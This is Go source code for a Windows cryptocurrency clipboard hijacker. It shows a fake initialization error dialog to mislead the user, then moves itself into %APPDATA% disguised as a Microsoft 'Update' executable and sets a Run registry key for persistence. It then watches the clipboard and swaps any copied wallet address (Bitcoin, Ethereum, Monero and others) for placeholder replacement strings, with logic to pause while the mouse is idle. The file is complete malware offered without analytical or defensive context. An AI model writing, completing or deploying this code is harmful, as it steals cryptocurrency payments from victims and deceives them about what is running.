package main

import (
	"fmt"
	"os"
	"regexp"
	"time"
	"path/filepath"

	"github.com/sqweek/dialog"
	"github.com/atotto/clipboard"
	"github.com/go-vgo/robotgo"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

const (
	dirName          = "Microsoft"
	fileName         = "Update"
	mutexName        = "Global\\qerhbfnuqeurtrbdtbqehvfrq"
	registryName     = "Update"
	clipboardFreq    = 500 * time.Millisecond
	inactivityTimeout = 15 * time.Minute
	mouseCheckFreq   = 1 * time.Second
)

type regexPair struct {
	pattern     *regexp.Regexp
	replacement string
}

var regexList = []regexPair{
	{regexp.MustCompile(`^[48][A-Za-z0-9]{94}$`), "XMR Address"},
	{regexp.MustCompile(`^L[a-zA-HJ-NP-Z0-9]{33}$`), "LTC Address"},
	{regexp.MustCompile(`^T[1-9A-HJ-NP-Za-km-z]{33}$`), "Trx address"},
	{regexp.MustCompile(`^0x[a-fA-F0-9]{40}$`), "eth address"},
	{regexp.MustCompile(`^r[0-9a-zA-Z]{24,34}$`), "Xrp address"},
	{regexp.MustCompile(`^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$`), "Doge address"},
	{regexp.MustCompile(`^(bitcoincash:)?[qp][a-z0-9]{41}$`), "bch address"},
	{regexp.MustCompile(`(^|\W)(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}($|\W)`), "btc address"},
	{regexp.MustCompile(`^t1[1-9A-HJ-NP-Za-km-zA-Z0-9]{33}$`), "Zcash Address"},
	{regexp.MustCompile(`^z[1-9A-HJ-NP-Za-km-zA-Z0-9]{33}$`), "Zcash Address"},
	{regexp.MustCompile(`^[1-9A-HJ-NP-Za-km-z]{32,44}$`), "Solana Address"},
	{regexp.MustCompile(`^bnb1[a-z0-9]{38}$`), "BNB Address"},
}

func main() {
	if !ensureSingleInstance() {
		fmt.Println("Another instance is already running.")
		return
	}

	executableName := filepath.Base(os.Args[0])
	time.Sleep(3 * time.Second)
	dialog.Message(
		"An error has occurred in the program during initialization. If this issue persists, please contact your system administrator.\n\n"+
			"Error Code: 0x80070426\n\n",
	).Title(executableName).Error()

	installSelf()
	monitorClipboard()
}

func ensureSingleInstance() bool {
	mutex, err := windows.CreateMutex(nil, false, windows.StringToUTF16Ptr(mutexName))
	if err != nil || windows.GetLastError() == windows.ERROR_ALREADY_EXISTS {
		return false
	}
	defer windows.CloseHandle(mutex)
	return true
}

func installSelf() {
	exePath, err := os.Executable()
	if err != nil {
		fmt.Println("Unable to determine executable path:", err)
		return
	}

	dirPath := filepath.Join(os.Getenv("APPDATA"), dirName)
	if _, err := os.Stat(dirPath); os.IsNotExist(err) {
		if err := os.Mkdir(dirPath, os.ModePerm); err != nil {
			fmt.Println("Failed to create directory:", err)
			return
		}
	}

	filePath := filepath.Join(dirPath, fileName+".exe")
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		if err := os.Rename(exePath, filePath); err != nil {
			fmt.Println("Failed to move executable:", err)
			return
		}
	}

	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err == nil {
		defer key.Close()
		key.SetStringValue(registryName, filePath)
	}
}

func monitorClipboard() {
	var lastClipboardText string
	clipboardChan := make(chan string, 1)
	inactivityTimer := time.NewTimer(inactivityTimeout)
	active := true

	go func() {
		for {
			if active {
				clipboardText, err := clipboard.ReadAll()
				if err == nil && clipboardText != lastClipboardText {
					clipboardChan <- clipboardText
					lastClipboardText = clipboardText
				}
			}
			time.Sleep(clipboardFreq)
		}
	}()

	go func() {
		var lastMouseX, lastMouseY int
		for {
			x, y := robotgo.GetMousePos()
			if x != lastMouseX || y != lastMouseY {
				inactivityTimer.Reset(inactivityTimeout)
				active = true
			}
			lastMouseX, lastMouseY = x, y
			time.Sleep(mouseCheckFreq)
		}
	}()

	for {
		select {
		case clipboardText := <-clipboardChan:
			processClipboardText(clipboardText)
		case <-inactivityTimer.C:
			fmt.Println("No activity detected, pausing clipboard monitoring.")
			active = false
		}
	}
}

func processClipboardText(text string) {
	for _, pair := range regexList {
		if pair.pattern.MatchString(text) {
			newText := pair.pattern.ReplaceAllString(text, pair.replacement)
			if err := clipboard.WriteAll(newText); err == nil {
				fmt.Println("Clipboard text replaced.")
			}
		}
	}
}
